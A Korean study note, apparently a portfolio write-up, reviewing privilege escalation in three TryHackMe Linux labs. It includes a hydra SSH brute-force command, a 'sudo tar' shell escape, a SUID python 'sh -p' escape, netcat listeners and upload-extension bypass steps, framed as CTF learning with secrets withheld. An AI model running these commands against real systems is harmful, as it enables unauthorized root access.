# THM Linux 권한 상승 복습 노트

> Bounty Hacker, LazyAdmin, RootMe 실습을 묶어서 정리한 Linux 침투 흐름 복습 문서입니다. 원본 노트에는 계정/플래그 값이 포함되어 있었지만, 공개 포트폴리오에서는 절차와 판단 기준만 남기고 민감 값은 제외했습니다.

## 1. 작성 목적

웹 취약점이나 서비스 노출은 단독으로 끝나지 않고, 계정 확보와 로컬 권한 상승으로 이어지는 경우가 많습니다. 이 문서는 TryHackMe 실습에서 반복해서 나온 흐름을 정리해, CTF형 평가에서 어떤 순서로 확인해야 하는지 복기하기 위해 작성했습니다.

정리한 실습:

- Bounty Hacker: anonymous FTP -> SSH 계정 확보 -> `sudo tar` 권한 상승
- LazyAdmin: CMS 업로드 -> reverse shell -> 스크립트 호출 흐름 악용
- RootMe: 업로드 확장자 우회 -> web shell/reverse shell -> SUID python 권한 상승

## 2. 공통 침투 루틴

세 문제를 비교해보면 흐름은 거의 같은 구조로 반복됩니다.

```text
포트/서비스 확인
-> 노출된 파일 또는 웹 기능 확인
-> 계정/쉘 확보
-> TTY 안정화
-> sudo/SUID/스크립트/백업 파일 확인
-> root 권한 상승 가능성 검증
-> 플래그 또는 영향 범위 확인
```

여기서 중요한 지점은 “쉘을 얻은 뒤 바로 끝났다고 생각하지 않는 것”입니다. `sudo -l`, SUID 파일, writable script, 백업 스크립트, cron, 환경변수, PATH 호출 방식을 계속 확인해야 다음 단계가 보입니다.

## 3. Bounty Hacker 복기

### 핵심 흐름

1. `nmap`으로 FTP, SSH, HTTP 포트 확인
2. FTP anonymous 로그인 가능 여부 확인
3. FTP에서 힌트 파일과 워드리스트 역할을 하는 파일 다운로드
4. 사용자명 힌트와 워드리스트로 SSH 로그인 가능성 확인
5. SSH 접속 후 `sudo -l` 확인
6. root 권한으로 실행 가능한 `tar` 확인
7. GTFOBins의 `tar` escape 패턴으로 root shell 획득

### 핵심 명령 패턴

```bash
ftp anonymous@<TARGET_IP>
mget *
hydra -l <USER> -P ./locks.txt <TARGET_IP> ssh -t 64
ssh <USER>@<TARGET_IP>
sudo -l
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### 배운 점

anonymous FTP에 올라온 작은 텍스트 파일도 계정 공격의 재료가 될 수 있습니다. FTP 파일은 단순히 “읽을 수 있다”에서 끝내지 말고, 사용자명 힌트인지, 워드리스트인지, 설정 파일인지 구분해서 봐야 합니다.

또한 `sudo -l`은 권한 상승의 시작점입니다. 특정 명령이 root 권한으로 허용되어 있다면 GTFOBins에서 shell escape 가능성을 먼저 확인하는 루틴이 필요하다고 느꼈습니다.

## 4. LazyAdmin 복기

### 핵심 흐름

1. 웹 경로 탐색으로 CMS 경로 확인
2. 관리자/업로드 기능 확인
3. PHP 업로드 또는 우회 가능한 확장자 확인
4. 업로드된 reverse shell 실행 후 `www-data` 쉘 확보
5. `linpeas.sh` 또는 수동 점검으로 sudo, writable script, backup script 확인
6. root 권한으로 호출되는 스크립트 흐름을 따라감
7. 호출되는 하위 스크립트에 reverse shell 내용을 넣어 root shell 유도

### 핵심 명령 패턴

```bash
python3 -m http.server 5555
nc -lvnp 4444
sudo -l
ls -al /etc/copy.sh /home/<USER>/backup.pl
sudo /usr/bin/perl /home/<USER>/backup.pl
```

### 배운 점

이 문제에서 헷갈렸던 부분은 파일을 덮어쓰는 행위와 실제 실행 시점이 다르다는 점이었습니다. `echo "..." > copy.sh`는 쉘을 실행하는 명령이 아니라, root 권한으로 호출될 스크립트의 내용을 바꾸는 준비 단계입니다.

권한 상승은 한 줄 명령만 외우는 것이 아니라, “누가 어떤 파일을 어떤 권한으로 실행하는가”를 추적하는 문제였습니다.

## 5. RootMe 복기

### 핵심 흐름

1. `gobuster`로 숨겨진 디렉터리 탐색
2. 업로드 기능 확인
3. `.php` 업로드 차단 여부 확인
4. Burp Intruder 또는 수동 테스트로 우회 가능한 확장자 확인
5. `php5`, `phtml` 같은 확장자로 reverse shell 업로드
6. `nc` listener로 쉘 획득
7. TTY 안정화 후 SUID 파일 탐색
8. SUID가 설정된 python 바이너리로 `sh -p` 실행

### 핵심 명령 패턴

```bash
gobuster dir -u http://<TARGET_IP> \
  --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x php,sh,html,js -t 60

find / -type f -perm -04000 2>/dev/null | xargs ls -al 2>/dev/null
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### 배운 점

업로드 필터가 확장자만 막는 경우에는 실행 가능한 대체 확장자를 확인해야 합니다. 하지만 실제 서비스에서는 무해한 PoC 기준으로 검증하고, 업로드된 파일이 다른 사용자에게 영향을 주지 않도록 범위를 제한해야 합니다.

SUID 탐색은 자동화 도구보다 수동 `find`가 빠를 때가 있습니다. 특히 `/usr/bin` 외의 비정상적인 위치에 있는 SUID 파일은 먼저 확인할 가치가 있습니다.

## 6. SUID 권한 상승 확인 기준

포너블/SUID 노트와 연결해서 정리한 기준입니다.

| 확인 항목 | 의미 |
|---|---|
| root 소유 SUID 파일 | 실행 시 파일 소유자 권한으로 동작할 수 있음 |
| 상대경로 명령 호출 | PATH 하이재킹 가능성 확인 |
| 환경변수 사용 | SUID secure-execution 모드에서 제한되는지 확인 |
| `strings` 결과 | 외부 명령 호출, 파일 경로, 스크립트 경로 확인 |
| GTFOBins 등재 여부 | shell escape 가능성 빠르게 확인 |

기본 확인 명령:

```bash
find / -perm -u=s -type f 2>/dev/null
strings /path/to/suid
```

## 7. 쉘 확보 후 확인 체크리스트

초기 쉘을 얻은 뒤에는 아래 순서로 확인합니다. 처음에는 자동화 도구를 돌리고 싶어지지만, 수동으로 기본 정보를 먼저 확인해야 도구 결과도 이해할 수 있습니다.

```bash
id
whoami
hostname
pwd
uname -a
sudo -l
find / -perm -u=s -type f 2>/dev/null
find / -writable -type d 2>/dev/null | head
ls -al /home /var/www /opt /tmp
cat /etc/crontab 2>/dev/null
```

| 확인 항목 | 보는 이유 |
| --- | --- |
| 현재 사용자와 그룹 | sudo 가능성, 파일 접근 범위 판단 |
| 홈 디렉터리 | 사용자별 힌트, SSH key, history 확인 |
| 웹 루트 | 업로드 파일, 설정 파일, DB 계정 노출 확인 |
| SUID 파일 | root 권한 실행 가능성 확인 |
| writable script | root가 호출하는 파일을 덮어쓸 수 있는지 확인 |
| cron/backup | 주기적으로 실행되는 권한 상승 지점 확인 |

이 체크리스트는 Bounty Hacker, LazyAdmin, RootMe를 복습하면서 공통으로 남은 루틴입니다. 문제 이름이 달라도 “누가 실행하는 파일인가”, “내가 쓸 수 있는 파일인가”, “root 권한으로 실행되는가”를 계속 묻는 방식은 같습니다.

## 8. 자주 헷갈린 지점

| 헷갈린 지점 | 정리한 기준 |
| --- | --- |
| 파일 다운로드와 계정 확보의 관계 | FTP 파일은 힌트, 사용자명, 워드리스트, 설정 파일로 다시 분류 |
| reverse shell 업로드 | 업로드 성공, 실행 성공, listener 연결을 각각 따로 확인 |
| 스크립트 덮어쓰기 | 파일을 바꾸는 행위와 root 권한 실행 시점은 다름 |
| SUID python | SUID 비트가 있는 python 바이너리인지 확인 후 `sh -p` 의미 이해 |
| linpeas 결과 | 자동 도구 출력은 후보이며, 최종 판단은 수동 명령으로 재확인 |

이 부분을 보고서에 적으면 단순 풀이보다 복기한 흔적이 더 잘 보입니다. 특히 “무엇을 몰라서 막혔고, 다음에는 어떤 체크리스트로 방지할 것인지”를 적는 것이 중요하다고 느꼈습니다.

## 9. 공개 보고서 작성 기준

공개 포트폴리오에서는 다음 항목을 그대로 노출하지 않습니다.

- 실제 크랙된 비밀번호
- 플래그 값
- 개인 IP, VPN IP
- 실습 중 생성한 private key
- 실제 서비스와 연결될 수 있는 도메인/계정 정보

대신 공개 문서에는 “어떤 정보가 다음 단계로 이어졌는지”와 “왜 그 명령을 실행했는지”를 남기는 편이 더 안전하고 재현 가능한 보고서라고 판단했습니다.

## 10. 정리

세 실습을 통해 Linux 권한 상승은 도구 하나로 끝나는 문제가 아니라는 것을 배웠습니다. FTP 파일, 업로드 기능, 스크립트 호출 관계, SUID 비트처럼 작은 단서를 연결해야 최종 권한 상승 흐름이 만들어집니다.

앞으로 비슷한 CTF 문제를 풀 때는 정찰 결과를 표로 정리하고, 쉘 확보 후에는 `sudo -l`, SUID, writable script, cron, PATH 호출을 빠짐없이 확인하는 루틴으로 접근할 계획입니다.
